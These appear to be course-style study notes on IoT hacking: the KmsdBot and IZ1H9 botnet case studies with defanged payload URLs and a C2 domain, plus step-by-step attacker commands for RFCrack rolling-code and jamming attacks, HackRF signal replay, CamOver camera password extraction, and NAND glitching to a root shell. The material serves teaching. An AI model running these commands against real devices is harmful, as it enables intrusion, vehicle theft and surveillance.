				- KmsdBot is a malware that targets IoT devices and has undergone significant updates since its discovery. The latest version, Kmsdx, introduces new functionalities, including Telnet scanning and authentication of legitimate Telnet services. This updated malware scans random IP addresses for open SSH ports and attempts to log in using a password list downloaded from the command-and-control (C2) server. Additionally, the Telnet scanner checks for valid services on port 23, expanding the botnet’s reach to a broader range of IoT devices.
				- With these updates, the malware now supports a wider range of CPU architectures commonly found in IoT devices. The incorporation of Telnet scanning alongside SSH scanning in the newer variant reduces the time and effort required by malware operators to exploit vulnerabilities. Furthermore, the enhanced legitimacy checks—such as verifying the receiving buffer for data—demonstrate the increasing sophistication of the malware’s targeting methods.
				- The KmsdBot scanning feature can easily detect IoT devices with default credentials, which are often left unchanged by users. By exploiting weak passwords stored in files like telnet.txt—which contain numerous commonly used password combinations—the malware increases the risk of IoT devices being compromised and integrated into bot networks.
			- WailingCrab
			- P2PInfect
			- NKAbuse
			- IoTroop
			- XorDdos
		- Case Study: IZ1H9 (unit42.paloaltonetworks.com):
			- IZ1H9 is a Mirai-based botnet malware discovered in early 2021 that continued to spread until 2023. Botnet malware has proliferated due to the exploitation of various vulnerabilities in IoT networks. Once a vulnerable device is identified and infected, IZ1H9 adds the compromised device to its botnet fleet. The malware hijacks the computational resources of these devices, using them for distributed denial-of-service (DDoS) attacks. IZ1H9 employs a sophisticated shell script downloader to evade security solutions, conceal its presence, and establish a persistent connection with a command-and-control (C2) server.
			- IZ1H9 Attack Scenario:
				- Step 1: Pre-Exploitation:
					- Attackers identify and target devices running Linux operating systems. They search for poorly configured devices and exploit vulnerabilities in exposed servers and networking devices within the IoT environment. Attackers scan for and exploit devices with the following vulnerabilities:
						- Tenda G103: Command injection vulnerability
						- LB-Link: Command injection vulnerability
						- DCN DCBI-Netlog-LAB: Remote code execution vulnerability
						- Zyxel: Remote code execution vulnerability
				- Step 2: Exploitation:
					- Attackers attempt to download and execute a shell script downloader (lb.sh) from IP 163.123.143[.]126 on vulnerable devices. The shell script downloader removes logs to hide its tracks and downloads bot clients for different Linux architectures, including:
						- hxxp://163.123.143[.]126/bins/dark.mips
						- hxxp://163.123.143[.]126/bins/dark.x86
						- hxxp://163.123.143[.]126/bins/dark.mpsl
						- hxxp://163.123.143[.]126/bins/dark.arm4
						- hxxp://163.123.143[.]126/bins/dark.arm5
						- hxxp://163.123.143[.]126/bins/dark.arm6
						- hxxp://163.123.143[.]126/bins/dark.arm7
						- hxxp://163.123.143[.]126/bins/dark.ppc
						- hxxp://163.123.143[.]126/bins/dark.m68k
						- hxxp://163.123.143[.]126/bins/dark.sh4
						- hxxp://163.123.143[.]126/bins/dark.86_64
					- Additional bot clients are downloaded from URLs such as hxxp://2.56.59[.]215/i.sh and hxxp://212.192.241[.]72/lolol.sh to communicate with the C2 domain dotheneedfull[.]club, which resolves to 212.192.241.72.
					- The botnet client ensures that only one execution instance exists at a time. If a botnet process is already running, the client overwrites the current process and starts a new one. Subsequently, bot clients initialize an encrypted string table and retrieve encrypted strings using an index for decryption.
					- The IZ1H9 variant decrypts its configuration strings using XOR decryption with the key 0xBAADF00D.
					- The malware then spreads through HTTP, SSH, and Telnet channels:
						- SSH and Telnet: Brute-force attacks using a list of nearly 100 weak username-password combinations.
						- HTTP: Remote code execution vulnerabilities to execute shellcode scripts for further compromise.
					- During Tenda vulnerability exploitation, the payload downloads tenda.sh but executes netlog.sh.
				- Step 3: Persistence:
					- Botnet clients establish persistent connections with hardcoded C2 networks. The attacker later defines a set of attack methods for specific targets using command codes, as shown below:
					- Command and Attack Methods (Command Code => Attack Method	: Description)
						- 0 => attack_method_tcpsyn: TCP SYN flooding attack
						- 1 => attack_method_tcpack: TCP ACK flooding attack
						- 2 => attack_method_tcpusyn: TCP URG-SYN flooding attack
						- 3 => attack_method_tcpall: TCP DDoS with all options set
						- 4 => attack_method_tcpfrag: TCP fragmentation attack
						- 5 => attack_method_asyn: TCP SYN-ACK flooding attack
						- 6 => attack_method_udpgame: UDP attack targeting online gaming servers
						- 7 => attack_method_udpplain: UDP flooding with minimal options
						- 8 => attack_method_greip: GRE IP flooding attack
						- 9 => attack_method_std: Standard flooding attack
						- 10 => attack_method_udpdns: DNS flooding attack
						- 11 => attack_app_http: HTTP flooding attack
						- 12 => attack_method_udpgeneric: Generic UDP flooding attack
						- 13 => attack_method_dnsamp: DNS amplification attack
	- IoT Hacking Methodology:
		- Using the IoT hacking methodology, an attacker gathers information through techniques such as reconnaissance, identifying the attack surface, and vulnerability scanning. This information is then used to hack the target device and network. This section focuses on the tools and techniques attackers use to compromise IoT devices.
		- What is IoT Device Hacking?
			- With the rapid growth of IoT technology, an increasing number of devices are becoming a part of our daily lives. From home automation to healthcare applications, IoT is everywhere. However, despite their convenience, IoT devices often lack fundamental security measures, making them highly vulnerable to cyberattacks.
			- Hackers exploit these vulnerabilities to gain unauthorized access to users' devices and data. Once compromised, IoT devices can be used to create botnets, which can then be leveraged to launch large-scale Distributed Denial-of-Service (DDoS) attacks.
		- How Hackers Profit from Compromised IoT Devices:
			- Today, smart devices store vast amounts of sensitive data, including location information, email accounts, financial details, and personal photos—making them a goldmine for cybercriminals. As the number of IoT devices continues to grow, projected to reach 75 billion by 2025, security risks escalate.
			- Due to weak security policies, smart devices become easy targets for hackers, who can exploit them for various malicious purposes, including:
				- Spying on users' activities
				- Misusing sensitive data (e.g., patient health records)
				- Deploying ransomware to block access to devices
				- Monitoring victims through compromised CCTV cameras
				- Carrying out credit card fraud
				- Gaining unauthorized access to homes
				- Adding compromised devices to botnets to execute DDoS attacks
		- IoT Hacking Methodology:
			- Hacking an IoT device typically involves the following phases:
				- Information Gathering
				- Vulnerability Scanning
				- Launching Attacks
				- Gaining Remote Access
				- Maintaining Access
		- Information Gathering:
			- The first and most crucial step in IoT device hacking is extracting information such as the IP address, protocols used (Zigbee, BLE, 5G, IPv6LoWPAN, etc.), open ports, device type, geo-location, manufacturing number, and manufacturing company of a device. During this phase, an attacker also identifies the hardware design, infrastructure, and main components embedded in a target device available online.
			- Attackers use tools such as Shodan, Censys, and FOFA to gather information or conduct reconnaissance on a target device. Additionally, devices that are not directly available on the network but are within the communication range can be detected using sniffers such as Suphacap, CloudShark, and Wireshark.
			- Information Gathering Using Shodan (www.shodan.io):
				- Shodan is a search engine that provides information about all Internet-connected devices, including routers, traffic lights, CCTV cameras, servers, smart home devices, and industrial systems. Attackers can leverage this tool to collect details such as the IP address, hostname, ISP, device location, and banner of a target IoT device.
				- Shodan Search Filters for IoT Devices:
					- Attackers can use the following filters to gather information on a target device:
					- Search for webcams using geolocation: webcamxp country:US
						- Finds all webcamxp webcams located in the US.
					- Search using city: webcamxp city:paris
						- Finds all existing webcamxp webcams in Paris.
					- Find webcams using longitude and latitude: webcamxp geo:-50.81,201.80
						- Finds a specific webcam at the geolocation (-50.81, 201.80) in Boston, US.
					- Additional Filters for Target Information:
						- net: Search based on the IP address or CIDR
						- os: Search based on the operating system used by the devices
						- port: Find all open ports
						- before/after: Filter results within a specific timeframe
			- Information Gathering Using MultiPing (www.multiping.com):
				- An attacker can use the MultiPing tool to discover the IP addresses of IoT devices within a target network. Once an IoT device’s IP address is obtained, the attacker can conduct further scanning to identify potential vulnerabilities in the device.
				- Steps to Identify the IP Address of an IoT Device Using MultiPing:
					- Open the MultiPing application and navigate to File -> Add Address Range.
					- In the Add Range of Addresses pop-up window:
						- Select the router’s gateway IP address from the Initial Address to Add drop-down menu.
						- Set the Number of Addresses to 255.
						- Click OK.
					- MultiPing will scan every possible IP address within the specified range and test each responding address.
					- Each row in the MultiPing window represents a device on the network. From this list, an attacker can identify the IP address of the target IoT device.
					- To speed up the scanning process, set the ping interval to 1 second.
			- Information Gathering Using FCC ID Search (www.fcc.gov):
				- FCC ID Search helps locate details about electronic devices and their certifications. The search page provides multiple fields to access device information. Each device is labeled with a unique FCC ID, which consists of two parts:
					- Grantee ID – The first three to five characters
					- Product ID – The remaining characters
				- To gather details about a target device using its FCC ID, follow these steps:
					- Locate the device and examine the attached label.
					- Identify the FCC ID printed on the label.
					- Visit the official FCC ID search page: https://www.fcc.gov/oet/ea/fccid
					- Enter the Grantee Code and Product ID in the respective fields.
					- Click “Search” to retrieve the device details, including frequency information.
					- For further insights:
						- Click “Summary” to view basic device details.
						- Click “Detail” to access additional documents such as the cover letter, external and internal photos, test reports, and user manuals.
				- Once the necessary information is gathered, an attacker can analyze potential vulnerabilities in the target device and exploit them for further attacks.
			- Information-Gathering Tools:
				- Attackers use information-gathering tools such as Shodan and Censys to collect basic details about target devices and networks. These tools provide attackers with information such as live devices connected to a network, their manufacturers, open ports and services, physical locations, and more.
				- Censys (censys.io):
					- Censys is a public search engine and data-processing platform that collects data from continuous Internet-wide scans. It supports full-text searches on protocol banners and queries across a wide range of derived fields. Censys helps identify vulnerable devices and networks while generating statistical reports on usage patterns and trends. By continuously monitoring every reachable server and device on the Internet, Censys enables real-time searches and analysis. It allows penetration testers to understand network attack surfaces, discover new threats, and assess their global impact. Censys gathers data on hosts and websites through daily ZMap and ZGrab scans of the IPv4 address space, maintaining a database of host and website configurations.
				- FOFA (en.fofa.info):
					- FOFA is a cyberspace mapping platform that allows attackers to collect IoT data from locations worldwide. Attackers use the FOFA search engine to analyze external attack surfaces, uncover Internet resources, assess risks associated with open Internet assets, and conduct intelligence-gathering activities.
			- Information Gathering through Sniffing:
				- Many IoT devices, such as security cameras, host a website for remote configuration and control. These websites often use the insecure HTTP protocol instead of HTTPS, making them vulnerable to various attacks. If the cameras are using default factory credentials, an attacker can easily intercept the traffic between the camera and the web application, potentially gaining access to the camera itself. Attackers can use tools such as Wireshark to capture this traffic and even decrypt the Wi-Fi key of the target network.
				- Steps Attackers Use to Sniff Wireless Traffic from a Web Camera:
					- Run Nmap to identify IoT devices using insecure HTTP ports for data transmission: nmap -p 80,81,8080,8081 <Target IP address range>
					- Set up your wireless card in monitor mode and identify the channel used by the target router for broadcasting:
						- Run ifconfig to identify your wireless card (e.g., wlan0).
						- Enable monitor mode with: airmon-ng start wlan0
					- Scan nearby wireless networks using Airodump-ng: airodump-ng wlan0mon
					- Identify the target wireless network and note the corresponding channel for sniffing traffic in Wireshark.
					- Configure your wireless card to listen to the target channel. If the target network’s channel is 11, run: airmon-ng start wlan0mon 11
					- Launch Wireshark and start capturing traffic:
						- Open Wireshark and double-click the interface set in monitor mode (wlan0mon).
						- Begin capturing packets.
				- Once the traffic is sniffed, attackers can decrypt WEP and WPA keys using Wireshark, potentially hacking the target IoT device and stealing sensitive information.
			- Sniffing Using Cascoda Packet Sniffer (www.cascoda.com):
				- Attackers use the Cascoda Packet Sniffer tool to capture IEEE 802.15.4 traffic from various IoT protocols, such as Thread, KNX-IoT, and Zigbee. This tool utilizes the Chili2D packet sniffing firmware to passively capture network traffic. It then decrypts and analyzes the sniffed packet headers using Wireshark, allowing for real-time packet capture monitoring or the option to save the data directly to a PCAP file. Additionally, it provides visibility into the received signal strength and link quality indicator (LQI) metrics of the sniffed IoT traffic.
				- Steps to Capture and Analyze IoT Traffic Using Cascoda Packet Sniffer:
					- The attacker downloads and installs Cascoda’s Windows tools and configures Wireshark to capture traffic.
					- The attacker connects the Cascoda Packet Sniffer dongle to their machine.
					- The attacker runs the command sniffer -w <channel_number> in the command prompt to start live packet capturing on a specified channel.
					- Wireshark begins capturing IoT traffic, which the attacker can filter using display filters, as shown in the screenshot below.
			- Sniffing Tools:
				- System administrators use automated tools to monitor their networks and connected devices. However, attackers can misuse these tools to intercept network data. Below are some tools that attackers may use to sniff traffic generated by IoT devices.
				- Suphacap (www.suphammer.net): Suphacap is a Z-Wave sniffer, a hardware tool used to capture traffic from smart devices connected to a network. It enables real-time monitoring and packet capture from all Z-Wave networks. Suphacap is compatible with various Z-Wave controllers, including Fibaro, Homeseer, Tridium Niagara, Z-Way, SmartThings, and Vera.
				- IoT Inspector 2 (github.com)
				- ZBOSS Sniffer (dsr-iot.com)
				- tcpdump (www.tcpdump.org)
				- Ubiqua Protocol Analyzer (www.ubilogix.com)
				- Perytons Protocol Analyzers (www.perytons.com)
		- Vulnerability Scanning:
			- Once attackers gather information about a target device, they search for its attack surfaces (i.e., vulnerabilities) that can be exploited. Vulnerability scanning enables an attacker to identify the number of vulnerabilities present in an IoT device’s firmware, infrastructure, and system components that are accessible. After determining the attack surface area, the attacker scans for vulnerabilities within that area to identify potential attack vectors and carry out further exploitation.
			- Vulnerability scanning helps attackers locate IoT devices with weak configurations, such as hidden exploits, firmware bugs, weak security settings and passwords, and poorly encrypted communications. However, it is also a crucial tool for security professionals, as it helps them identify security loopholes or vulnerabilities in IoT devices before attackers can exploit them.
			- Vulnerability Scanning Using IoTSeeker (github.com):
				- Attackers use tools like IoTSeeker to discover IoT devices that are still using default credentials, making them vulnerable to various hijacking attacks. IoTSeeker scans a network for specific types of IoT devices to check whether they are still operating with factory-set credentials. In fact, a recent internet outage has been attributed to compromised IoT devices—such as CCTV cameras and DVRs—that were left with default login credentials.
				- This tool also helps organizations scan their networks to detect such vulnerable IoT devices, determine whether their credentials have been changed, and verify if any devices are still using factory settings. IoTSeeker primarily focuses on HTTP/HTTPS services.
				- For example, attackers may run the following command to find devices with default credentials: perl iotScanner.pl <IP address/range of IPs>
			- Vulnerability Scanning Using Genzai (github.com):
				- Genzai is an IoT security toolkit that allows users to detect and scan IoT dashboards, including wireless routers, surveillance cameras, and human-machine interfaces (HMIs), for default passwords and vulnerabilities based on paths and versions. This tool fingerprints an IoT product running on a target by analyzing HTTP responses using a set of signatures and templates. It then scans for vendor-specific default credentials, such as admin:admin, and other potential security weaknesses.
				- To scan a target IoT device’s dashboard and save the output in JSON format, run the following command: ./genzai <target_host> -save scan.json
			- Vulnerability Scanning Using Nmap:
				- Attackers use vulnerability-scanning tools such as Nmap to identify IoT devices connected to a network, along with their open ports and running services. Nmap generates raw IP packets in various ways to detect live hosts or devices on the network, determine the services they offer, identify their operating systems, and analyze the type of packet filters in use. Additionally, attackers may use tools like Angry IP Scanner for similar purposes.
				- Below are some Nmap commands commonly used for scanning IoT devices:
					- To scan a specific IP address: nmap -n -Pn -sS -pT:0-65535 -v -A -oX <Name><IP>
					- To perform a complete scan that checks for both TCP and UDP services and ports: nmap -n -Pn -sSU -pT:0-65535,U:0-65535 -v -A -oX <Name><IP>
					- To identify the IPv6 capabilities of a device: nmap -6 -n -Pn -sSU -pT:0-65535,U:0-65535 -v -A -oX <Name><IP>
			- Vulnerability-Scanning Tools:
				- Vulnerability scanning enables attackers to identify weaknesses in IoT devices and their networks and assess how these vulnerabilities can be exploited. These tools also assist network security professionals in identifying and mitigating security flaws by providing remediation techniques to protect an organization’s network.
				- beSTORM (www.beyondsecurity.com): beSTORM is an advanced fuzzing tool designed to detect buffer overflow vulnerabilities by automating and documenting the process of delivering corrupted inputs and analyzing application responses. Using automated protocol-based fuzzing techniques, beSTORM functions as a black-box auditing tool, systematically testing attack combinations by prioritizing the most probable scenarios. It identifies application anomalies that indicate potential security breaches, helping uncover code weaknesses and assess a product’s security without requiring access to its source code. beSTORM can test various protocols and hardware, including those used in IoT, process control systems, automotive technology, and aerospace applications.
				- Metasploit (www.rapid7.com)
				- IoTsploit (iotsploit.co)
				- IoTSeeker (www.rapid7.com)
				- IoTVAS (firmalyzer.com)
				- Enterprise IoT Security (www.paloaltonetworks.com)
			- Analyzing Spectrum and IoT Traffic:
				- Analyzing Spectrum Using Gqrx (www.gqrx.dk):
					- Gqrx is an SDR (Software-Defined Radio) application built using GNU Radio and the Qt GUI toolkit. Attackers use hardware devices such as the FunCube Dongle, Airspy, HackRF, RTL-SDR, and USRP, along with Gqrx SDR, to analyze the radio spectrum. Gqrx allows attackers to observe the frequency bands of temperature/humidity sensors, light switches, car keys, M-bus transmitters, and more. Additionally, Gqrx can enable attackers to eavesdrop on FM radio frequencies and other radio communications.
					- Steps to Analyze the Spectrum Using Gqrx:
						- Install Gqrx and GNU Radio:
							- The Gqrx package includes all necessary utilities. Use the following commands to download and install it from GitHub:
								git clone https://github.com/gqrx-sdr/gqrx.git
								cd gqrx
								mkdir build
								cd build
								cmake ..
								make
						- Attackers often use hardware tools such as the FunCube Dongle Pro+, which connects via a USB port on a PC to analyze various frequency bands.
						- Launch Gqrx:
							- Run the following command to start Gqrx: gqrx
						- Analyze the Spectrum:
							- The central window of Gqrx displays detected frequencies, and the corresponding signals can be heard through headphones or speakers.
					- By adjusting the FFT settings (located at the bottom-right corner), users can capture and analyze different frequencies in their vicinity.
				- Analyzing IoT Traffic Using ONEKEY (onekey.com):
					- Attackers use tools such as ONEKEY to identify target IoT devices and analyze their network traffic to uncover vulnerabilities. IoT Inspector assists attackers in breaching privacy and security mechanisms. This tool presents vulnerabilities in tables and graphs, allowing for easy analysis. Additionally, it enables attackers to record and replay communication data to extract sensitive information.
					- ONEKEY automatically scans and displays available devices on the network. Selecting a target device reveals its network activity and communication endpoints. Clicking on "Network Activities" presents a live chart of the device's traffic, while the "Communication Endpoints" section displays the services the IoT device has accessed.
			- Tools for Performing SDR-Based Attacks:
				- Attackers use various tools, such as RTL-SDR, GNU Radio, and Universal Radio Hacker, to conduct different types of attacks on SDR-based devices. These include reconnaissance attacks, replay attacks, and cryptanalysis attacks.
				- Universal Radio Hacker (github.com):
					- Universal Radio Hacker (URH) is a software tool used to analyze and investigate unknown wireless protocols employed by various IoT devices.
					- URH enables attackers to:
						- Identify hardware interfaces for common SDRs
						- Demodulate signals
						- Assign participants to track and analyze data
						- Crack complex encodings, such as CC1101 data whitening
						- Assign labels to interpret protocol logic
						- Automatically reverse-engineer protocol fields
						- Perform fuzz testing to identify security vulnerabilities
						- Modulate signals to inject data back into the system
				- BladeRF (www.nuand.com)
				- TempestSDR (github.com)
				- HackRF One (greatscottgadgets.com)
				- GP-Simulator (gpspatron.com)
				- Gqrx (gqrx.dk)
		- Launch Attacks:
			- During the vulnerability scanning phase, attackers attempt to identify weaknesses in the target device. Once vulnerabilities are discovered, they are exploited to launch various attacks, including DDoS attacks, rolling-code attacks, signal-jamming attacks, Sybil attacks, MITM (Man-in-the-Middle) attacks, and data and identity theft.
			- For instance, an attacker can use the RFCrack tool to execute rolling-code attacks, replay attacks, and jamming attacks on a device. Similarly, tools such as KillerBee can be used to exploit vulnerabilities in ZigBee and IEEE 802.15.4 networks.
			- Rolling Code Attack Using RFCrack (github.com):
				- Attackers leverage the RFCrack tool to capture the rolling code transmitted by a victim to unlock a vehicle. The same code can then be replayed to unlock and steal the vehicle. RFCrack is primarily used for testing RF (radio frequency) communications between physical devices operating on sub-GHz frequencies. It is often used in combination with Yardstick hardware to jam, replay, and sniff signals sent from a transmitter.
				- Attacks Performed Using RFCrack:
					- Replay attacks (-i -F)
					- Send saved payloads (-s –u)
					- Rolling-code bypass attacks (-r -F -M)
					- Jamming (-j -F)
					- Incremental frequency scanning (-b -v -F)
					- Scanning common frequencies (-k)
				- Commands Used for Rolling-Code Attack:
					- Live replay: python RFCrack.py -i
					- Rolling code attack: python RFCrack.py -r -M MOD_2FSK -F 314350000
					- Adjust RSSI range: python RFCrack.py -r -M MOD_2FSK -F 314350000 -U -100 -L -10
					- Jamming attack: python RFCrack.py -j -F 314000000
					- Scan common frequencies: python RFCrack.py -k
					- Scan using a custom frequency list: python RFCrack.py -k -f 433000000 314000000 390000000
					- Incremental frequency scan: python RFCrack.py -b -v 5000000
					- Send saved payload: python RFCrack.py -s -u ./captures/test.cap -F 315000000 -M MOD_ASK_OOK
			- Analyzing Zigbee Devices with Open Sniffer (www.sewio.net):
				- Open Sniffer is a Wireshark-based analyzer device that enables users to capture and analyze packets from IEEE 802.15.4, Zigbee, 6LoWPAN, WirelessHART, and ISA100.11a-based networks. It features two multiband antennas and uses USB-powered cables for connectivity, allowing packet sniffing through an Ethernet port or a network switch.
				- With Open Sniffer, users can capture all IEEE 802.15.4 frames transmitted over the air within its physical range and visualize them on a specific channel in Wireshark. Additionally, the tool can transmit packets to a selected channel using various transmission types, modulations, and power levels. This capability allows for testing network resilience, such as simulating high-traffic scenarios or interference.
				- Open Sniffer also enables the replay of captured frames by sending user-defined packets, which can be useful for debugging and security assessments. Furthermore, it can scan and detect energy levels across all available channels within supported frequency bands, displaying the results in a graphical format for analysis.
			- BlueBorne Attack Using HackRF One (greatscottgadgets.com):
				- IoT devices rely on wireless communication technologies such as RF, ZigBee, and LoRa. Attackers can use HackRF One to carry out attacks like BlueBorne and AirBorne, including replay, fuzzing, and jamming. HackRF One is an advanced hardware and software-defined radio with a frequency range of 1 MHz to 6 GHz. It operates in half-duplex mode, allowing attackers to easily execute attacks. Additionally, it can intercept a wide range of wireless protocols, from GSM to Z-Wave.
			- Replay Attack Using HackRF One:
				- Attackers can execute replay attacks on IoT devices using tools like HackRF One. To carry out this attack, they first need to identify the radio frequency of the target device. This can be done by referencing online resources such as the FCC database or by using tools like RTL-SDR to scan for frequencies of nearby devices.
				- Once the frequency is identified, attackers can use HackRF One to capture and replay the signal, effectively mimicking the target device's communication.
				- Steps to Perform a Replay Attack on an IoT Device:
					- Record the device’s signal using the following command: hackrf_transfer -r captured_signal.raw -f [device frequency]
							-r: Records the signal
							-f: Specifies the device's frequency
					- Replay the recorded signal to the target device using the following command: hackrf_transfer -t captured_signal.raw -f [device frequency]
						-t: Replays the recorded signal
				- Once the attack is successfully executed, the attacker gains the ability to control the target IoT device, potentially using it to launch further attacks.
			- SDR-Based Attacks Using RTL-SDR and GNU Radio:
				- Hardware-Based Attack:
					- Attackers use hardware tools such as RTL-SDR to carry out SDR-based attacks on IoT devices.
					- RTL-SDR (www.rtl-sdr.com):
						- RTL-SDR hardware is available as a USB dongle that can capture active radio signals in the vicinity without requiring an internet connection. It comes in various models, such as DVB-T SDR, RTL2832, RTL dongle, and DVB-T dongle. The RTL-SDR tool can capture frequencies ranging from 500 kHz to 1.75 GHz, depending on the selected SDR model.
						- Attackers use an RTL-SDR radio scanner to perform the following activities:
							- Receiving and decoding GPS signals
							- Analyzing the spectrum
							- Listening to DAB broadcast radio
							- Listening to and decoding HD radio
							- Sniffing GSM signals
							- Listening to VHF amateur radio
							- Scanning trunked radio conversations
							- Scanning for cordless phones
				- Software-Based Attack:
					- In addition to hardware tools, attackers can exploit SDR-based IoT devices using various software tools, such as GNU Radio.
					- GNU Radio (www.gnuradio.org):
						- GNU Radio utilizes external RF hardware to implement SDR. It provides a framework and essential tools for generating software-defined radio signals, along with signal processing units for executing software radios. Attackers leverage GNU Radio to conduct various SDR-based attacks on target IoT devices.
						- Before launching an attack, attackers must build and configure GNU Radio. Once successfully installed, they use the following tools for further exploitation.
						- GNU Radio includes several pre-defined programs and tools that serve various purposes:
							- uhd_fft -> A spectrum analyzer tool that connects to a UHD device to analyze the spectrum at a given frequency.
							- uhd_rx_cfile -> Stores waveform samples using a UHD device; these samples can later be analyzed using GNU Radio or similar tools such as MATLAB or Octave.
							- uhd_rx_nogui -> Captures and plays incoming signals through an audio device.
							- uhd_siggen_gui -> Generates simple signals, such as sine waves, square waves, or noise.
							- gr_plot -> Displays previously recorded samples stored in a file.
			- Side-Channel Attack Using ChipWhisperer (newae.com):
				- ChipWhisperer is an open-source toolchain primarily used for embedded hardware security research, particularly for performing side-channel power analysis and glitching attacks. These attacks are commonly employed to extract cryptographic keys from a system. A side-channel attack is a cryptographic attack that exploits the physical implementation of a system—such as its power consumption, timing variations, sound emissions, or electromagnetic leaks—rather than targeting vulnerabilities in the code itself.
				- To perform a side-channel attack using ChipWhisperer, two key hardware components are required:
					- Capture Board: Specialized hardware designed to capture extremely small signals with a precisely synchronized clock.
					- Target Board: A processor that can be programmed to execute secure operations.
				- Attackers use ChipWhisperer to compromise the implementation of complex cryptographic algorithms such as AES and Triple DES through a technique called power analysis, a form of side-channel attack. In this method, the attacker controls the input data while monitoring the system's power consumption. By XORing the known input data with the unknown input data, they derive the unknown output data. The guessed secret key is then compared against real power consumption measurements to recover the original secret key.
				- Some common types of side-channel attacks used to extract sensitive information include:
					- Cache attacks
					- Timing attacks
					- Power-monitoring attacks
					- Electromagnetic attacks
					- Acoustic cryptanalysis
					- Fault analysis
					- Data remanence attacks
					- Optical attacks
				- In addition to power analysis, ChipWhisperer is also used for fault injection attacks, where an attacker induces glitches in embedded hardware to manipulate code execution. This is achieved by tampering with the device's clock or input power, potentially leading to unintended behavior that reveals sensitive information.
			- Identifying IoT Communication Buses and Interfaces:
				- Attackers identify various serial and parallel interfaces such as Universal Asynchronous Receiver-Transmitter (UART), Serial Peripheral Interface (SPI), Joint Test Action Group (JTAG), and Inter-Integrated Circuit (I2C) to gain access to a shell, extract firmware, and perform other attacks. They use tools such as BUS Auditor, Damn Insecure and Vulnerable Application (DIVA), and a printed circuit board (PCB) to identify these interfaces.
				- BUS Auditor consists of 16 independent channels (CH0 to CH15). To begin, the ground pins of both the BUS Auditor and the DIVA IoT board must be connected.
				- UART:
					- The following steps outline how to identify a UART interface on a PCB without microcontroller data:
						- Connect channels CH0 and CH1 of the BUS Auditor to the UART header.
						- Connect both the DIVA IoT board and the BUS Auditor to the computer.
						- Run the following command in the EXPLIoT framework: run busauditor.generic.uartscan -v 3.3 -p /dev/ttyACM0 -s 0 -e 1
							-v -> Voltage
							-p -> Device port (/dev/tty*)
							-s -> Starting channel
							-e -> Ending channel
				- JTAG:
					- The Joint Test Action Group (JTAG), standardized as IEEE 1149.1, consists of four primary pins—Test Mode Select (TMS), Test Clock (TCK), Test Data In (TDI), and Test Data Out (TDO)—along with an optional Test Reset (TRST) pin.
					- The following steps outline how to identify a JTAG interface:
						- Connect channels CH0 to CH8 of the BUS Auditor to the JTAG header.
						- Connect both the DIVA board and the BUS Auditor to the computer.
						- Run the following command in the EXPLIoT framework: run busauditor.generic.jtagscan -v 3.3 -p /dev/ttyACM0 -s 0 -e 10
				- I2C:
					- The Inter-Integrated Circuit (I2C) protocol uses a Serial Data (SDA) line for data transmission and a Serial Clock (SCL) line for synchronization.
					- To identify an I2C interface, follow these steps:
						- Connect channels CH0 to CH8 of the BUS Auditor to the header.
						- Connect both the DIVA board and the BUS Auditor to the computer.
						- Run the following command in the EXPLIoT framework: run busauditor.generic.i2scan -v 3.3 -p /dev/ttyACM0 -s 0 -e 10
				- SPI:
					- To identify a Serial Peripheral Interface (SPI) and its pinouts, attackers often perform a Google search using the chip's model number.
			- Interface Identification Tools:
				- JTAGulator (grandideastudio.com)
				- Attify Badge (www.attify-store.com)
				- Saleae Logic Analyzer (www.saleae.com)
			- NAND Glitching:
				- Attackers often attempt to gain privileged access to IoT devices or routers by exploiting boot vulnerabilities using techniques such as glitching. NAND glitching is a method of obtaining privileged root access during the boot process by briefly grounding the serial I/O pin of a flash memory chip. This exploits a common vulnerability in embedded devices: a backup process stored in local flash memory that grants privileged single-user access when a boot failure occurs. A well-timed glitch—lasting as little as 1 millisecond—can trigger this failure, leading to root access on the target device.
				- Steps for Implementing NAND Glitching:
					- Reconnaissance with UART-USB Converter:
						- Execute the following command to initiate a reconnaissance process using a UART-USB converter: minicom -D /dev/ttyUSB0 -w -C D-link_startup.txt
						- This command captures boot logs during device startup, helping the attacker identify the specific memory chip that contains the boot firmware.
					- Glitching the Boot Process:
						- Short the serial I/O pin of the flash memory chip to ground to interrupt the boot process. This forces the device to load its backup bootloader.
						- Run the following command to display the boot arguments (bootargs) loaded during this process: printenv
						- This returns output similar to: bootargs=noinitrd console=ttyAM0,115200 ubi.mtd=5 root=ubi0:rootfs rw gpmi badupdater
						- Modify the boot arguments by running: setenv bootargs 'noinitrd console=ttyAM0,115200 rootfstype=ubifs ubi.mtd=5 root=ubi0:rootfs rw gpmi init=/bin/sh'
					- Gaining Root Access:
						- Execute the following command on the UART console to gain root access: nand read ${loadaddr} app-kernel 0x00400000 && bootm ${loadaddr}
							- The nand read command reads the backup privileged boot image from flash memory.
							- The bootm command loads this backup, allowing the attacker to obtain root access.
						- This process effectively bypasses security mechanisms and provides the attacker with full control over the target device.
			- Exploiting Cameras Using CamOver (github.com):
				- CamOver is a camera exploitation tool that enables attackers to retrieve network camera administrator passwords. It can be used to exploit vulnerabilities in popular camera models, such as CCTV, GoAhead, and Netwave. Additionally, this tool is optimized for exploiting multiple cameras simultaneously using a thread-enabled list.
				- The following are some commands used to exploit cameras with CamOver:
					- Run the camover command in the terminal to initialize the tool.
					- Exploit a single camera using a specific IP address with the following command: camover -a <Camera IP Address>
					- Exploit cameras connected to the Internet using the Shodan search engine: camover -t --shodan <Shodan API Key>
		- Gain Remote Access:
			- Vulnerabilities identified during the vulnerability-scanning phase can allow an attacker to remotely gain access, establish command and control, and evade detection by various security products. Depending on the vulnerabilities in an IoT device, an attacker may use the device as a backdoor to access an organization’s network without infecting any endpoint protected by IDS/IPS, firewalls, antivirus software, etc. After gaining remote access, attackers can use these compromised devices as platforms to launch further attacks on other devices within the network.
			- Gaining Remote Access Using Telnet:
				- Attackers perform port scanning to identify open ports and services on the target IoT device. If the Telnet port is open, an attacker can exploit this vulnerability to gain remote access to the device. Many embedded system applications in IoT devices, such as industrial control systems, routers, VoIP phones, and televisions, implement remote access capabilities using Telnet. These applications typically include a Telnet server for remote access.
				- Once an attacker identifies an open Telnet port, they can analyze the information exchanged between connected devices, including details about their software and hardware models. The attacker then exploits specific vulnerabilities based on this information.
				- First, the attacker determines whether authentication is required. If not, they can immediately gain unauthorized access to explore the data stored on the device. If authentication is required, the attacker attempts to bypass it by using default credentials such as root/root or system/system or by performing a brute-force attack to obtain administrator or user account passwords.
				- For example, attackers can use tools such as Shodan and Censys to scan for vulnerable devices and gain remote access.
		- Maintaining Access:
